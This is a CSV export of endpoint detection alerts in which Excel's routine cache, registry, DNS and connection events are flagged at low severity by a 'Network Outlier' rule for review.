"Jun 1, 2026 @ 14:23:57.953",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\1AB3337.xlsx,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-68AF7562
"Jun 1, 2026 @ 14:23:57.946",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\1AB3337.xlsx,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D98B1FE4
"Jun 1, 2026 @ 14:23:57.395",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\AT\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-FD22C573
"Jun 1, 2026 @ 14:23:57.375",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\data.json,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6ADF9A51
"Jun 1, 2026 @ 14:23:57.372",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\2a5ae2d3b00dc85f60bf6c9e5197c6940ee9ce62.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BD9EEEFB
"Jun 1, 2026 @ 14:23:34.874",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8559EC55
"Jun 1, 2026 @ 14:23:34.853",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\Diagnostics\EXCEL\Primary1780303493679901500_E942B7AB-9D07-4007-87E7-48A1C69393BB.log,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-333E3CB2
"Jun 1, 2026 @ 14:23:34.849",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-60888FE1
"Jun 1, 2026 @ 14:23:34.669",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-87BABFEA
"Jun 1, 2026 @ 14:23:34.662",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1EF85EA1
"Jun 1, 2026 @ 14:23:58.211",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F7FHFIBFG2FGHIA4DGFJFXEKGADHCVCE.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6AA9BE19
"Jun 1, 2026 @ 14:23:58.210",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F7FHFIBFG2FGHIA4DGFJFXEKGADHCVCE.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C8A44F8A
"Jun 1, 2026 @ 14:23:58.204",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWHWC5CQDZHLB5FZHMDNAUEHEADSBEE3.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0411161A
"Jun 1, 2026 @ 14:23:58.203",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWHWC5CQDZHLB5FZHMDNAUEHEADSBEE3.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A1EAC080
"Jun 1, 2026 @ 14:23:58.196",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GIBAFFAZCTGLCFBOBTDTGOAWDCCFEWEO.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9D68B909
"Jun 1, 2026 @ 14:23:58.195",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GIBAFFAZCTGLCFBOBTDTGOAWDCCFEWEO.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BFA2AA8F
"Jun 1, 2026 @ 14:23:58.189",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FVE2BFFDBWDABNCQF5DQBTFQGPEHHBGZ.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BBD218E8
"Jun 1, 2026 @ 14:23:58.188",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FVE2BFFDBWDABNCQF5DQBTFQGPEHHBGZ.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9805D517
"Jun 1, 2026 @ 14:23:58.181",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BBAXEGHKCEFYD7ESFSBNBUCEDDBZF7BD.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1C74C98D
"Jun 1, 2026 @ 14:23:58.180",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BBAXEGHKCEFYD7ESFSBNBUCEDDBZF7BD.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E1BC0EE2
"Jun 1, 2026 @ 14:23:58.174",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EOHMCMGQCXEWDEEZFOF2AVHCCTFJD5DQ.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6397D903
"Jun 1, 2026 @ 14:23:58.239",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BJEQEPEHE6GODBBWF6BHBFHLEGGCBRHB.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8F3ED56B
"Jun 1, 2026 @ 14:23:58.233",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BQDLFNBYCLCUEHHDDCAYE2EYHVEQEPFH.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-212C3974
"Jun 1, 2026 @ 14:23:58.232",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BQDLFNBYCLCUEHHDDCAYE2EYHVEQEPFH.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9918EF87
"Jun 1, 2026 @ 14:23:58.218",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ECBDE3HWE5FCHPADGIEOGUCBF7EFHQEF.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B227E412
"Jun 1, 2026 @ 14:23:58.217",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ECBDE3HWE5FCHPADGIEOGUCBF7EFHQEF.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6B52A043
"Jun 1, 2026 @ 14:23:35.121",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.123.129.14,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-93477E90
"Jun 1, 2026 @ 14:23:35.104",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,ecs.office.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-45B7F607
"Jun 1, 2026 @ 14:23:35.057",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,ecs.office.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F2C095AD
"Jun 1, 2026 @ 14:23:35.049",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\e2cdfdebdbf5934269ce32e8b243aa8a2d32689d.tbres,,open,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-DE08BA84
"Jun 1, 2026 @ 14:23:34.944",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0D042ABD
"Jun 1, 2026 @ 14:23:34.913",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\f036564d8b727dbe99499799c7e51936a642f62a.tbres,,open,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9313DF8D
"Jun 1, 2026 @ 14:23:34.907",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A2B8B475
"Jun 1, 2026 @ 14:23:34.892",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\Diagnostics\EXCEL\Additional\Additional1780303493732825900_E942B7AB-9D07-4007-87E7-48A1C69393BB.log,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-401C9844
"Jun 1, 2026 @ 14:23:34.878",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-638FDDC6
"Jun 1, 2026 @ 14:23:34.876",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-532A118A
"Jun 1, 2026 @ 14:23:34.875",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F11BE5B4
"Jun 1, 2026 @ 14:23:58.336",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F5EKCQCMELGUHHB3ABHBABDYAUHXCQGV.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-94D1D696
"Jun 1, 2026 @ 14:23:58.321",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ETCZCBC6BODQAJBMHDDPHWEOC2CWBYE3.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9BFFCC70
"Jun 1, 2026 @ 14:23:58.320",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ETCZCBC6BODQAJBMHDDPHWEOC2CWBYE3.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B3CEC466
"Jun 1, 2026 @ 14:23:58.313",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HBEMHWA3H6HUCUDQCMALF2DUDNHNGTDK.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-65DB140F
"Jun 1, 2026 @ 14:23:58.312",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HBEMHWA3H6HUCUDQCMALF2DUDNHNGTDK.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-3F878830
"Jun 1, 2026 @ 14:23:58.280",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWHZHPCMG3HOHED7G2FOEACJEKHWDACI.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-319A722C
"Jun 1, 2026 @ 14:23:58.279",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWHZHPCMG3HOHED7G2FOEACJEKHWDACI.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-62932BE2
"Jun 1, 2026 @ 14:23:58.271",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_APFIGWGNFNFGBCFRBVBVFJHSADCDEFHU.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C48436ED
"Jun 1, 2026 @ 14:23:58.270",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_APFIGWGNFNFGBCFRBVBVFJHSADCDEFHU.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-EAEF7F9E
"Jun 1, 2026 @ 14:23:58.262",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HLEUCNG6BUGMCJC2EVCZD4AVE5CBESFL.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6FED1E16
"Jun 1, 2026 @ 14:23:58.261",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HLEUCNG6BUGMCJC2EVCZD4AVE5CBESFL.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5669F3C0
"Jun 1, 2026 @ 14:23:58.254",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FREPFMDECGGKHFCIEECBDVFMAHEWHREX.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D9D9B652
"Jun 1, 2026 @ 14:23:58.253",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FREPFMDECGGKHFCIEECBDVFMAHEWHREX.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-09B04F53
"Jun 1, 2026 @ 14:23:58.247",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BDHFHCHQGMHWCZBRF4CGCKF6CUASAOBT.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B694F8E7
"Jun 1, 2026 @ 14:23:58.246",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BDHFHCHQGMHWCZBRF4CGCKF6CUASAOBT.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C5FD87C8
"Jun 1, 2026 @ 14:23:58.240",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BJEQEPEHE6GODBBWF6BHBFHLEGGCBRHB.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D200BEC9
"Jun 1, 2026 @ 14:23:58.397",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWDZA3HMB7DBCNAPDOGIE4A7FIHMEKGK.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-4FDC77DC
"Jun 1, 2026 @ 14:23:58.390",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CREKCECIDEERCICQCVC2BIACAJCPEJHX.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-843ED482
"Jun 1, 2026 @ 14:23:58.389",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CREKCECIDEERCICQCVC2BIACAJCPEJHX.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BF331569
"Jun 1, 2026 @ 14:23:58.384",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_D4F3ADF6BNEBG7G6GSBMETCSHGD2EDDV.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-4D227B5E
"Jun 1, 2026 @ 14:23:58.383",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_D4F3ADF6BNEBG7G6GSBMETCSHGD2EDDV.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-CAC906F5
"Jun 1, 2026 @ 14:23:58.382",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GRD4EQHVGFAJABH6EUC3H6ECBKAUDCDC.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7C4722B0
"Jun 1, 2026 @ 14:23:58.381",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GRD4EQHVGFAJABH6EUC3H6ECBKAUDCDC.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0F574851
"Jun 1, 2026 @ 14:23:58.374",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HRDDFPA7AUG7GDFOA3DOAIDSGQDSDUET.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D2C9991E
"Jun 1, 2026 @ 14:23:58.373",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HRDDFPA7AUG7GDFOA3DOAIDSGQDSDUET.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-CDA79553
"Jun 1, 2026 @ 14:23:58.368",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_DBCSGOCCFXAPFUEDEBEMHMG4DWFTGCDB.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-07062C50
"Jun 1, 2026 @ 14:23:58.366",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CJCECKDKGSH3D7B3F5CIA3GSCZEKHSBD.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7214EA6F
"Jun 1, 2026 @ 14:23:58.360",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E7FDFAFXFVBWCQHRGQDXHQGHFHAIGGEN.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-86550580
"Jun 1, 2026 @ 14:23:58.359",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E7FDFAFXFVBWCQHRGQDXHQGHFHAIGGEN.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A4BFC4BA
